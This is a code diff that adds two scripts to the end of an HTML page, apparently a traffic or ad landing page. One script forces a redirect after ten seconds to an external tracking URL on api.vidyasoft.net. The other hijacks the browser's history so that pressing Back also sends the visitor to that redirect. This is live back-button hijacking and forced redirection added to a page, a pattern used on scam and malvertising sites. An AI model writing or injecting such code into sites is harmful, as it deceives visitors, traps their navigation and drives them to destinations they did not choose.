@@ -396,5 +396,33 @@
 
 
 
+<script>
+var count = 10;
+var counter = setInterval(timer, 1000);
 
+function timer() {
+    count = count - 1;
+    if (count <= 0) {
+        clearInterval(counter);
+        window.location = 'https://api.vidyasoft.net/redirect?utm_source=insta&cid={clickId}&language={lang}'
+        return;
+    }
+}
+</script>
+
+<script>
+(function(window, location) {
+history.replaceState(null, document.title, location.pathname+"#!/history");
+history.pushState(null, document.title, location.pathname);
+
+window.addEventListener("popstate", function() {
+  if(location.hash === "#!/history") {
+    history.replaceState(null, document.title, location.pathname);
+    setTimeout(function(){
+      location.replace("https://api.vidyasoft.net/redirect?utm_source=insta&cid={clickId}&language={lang}");
+    },0);
+  }
+}, false);
+}(window, location));
+</script>
 </body></html>
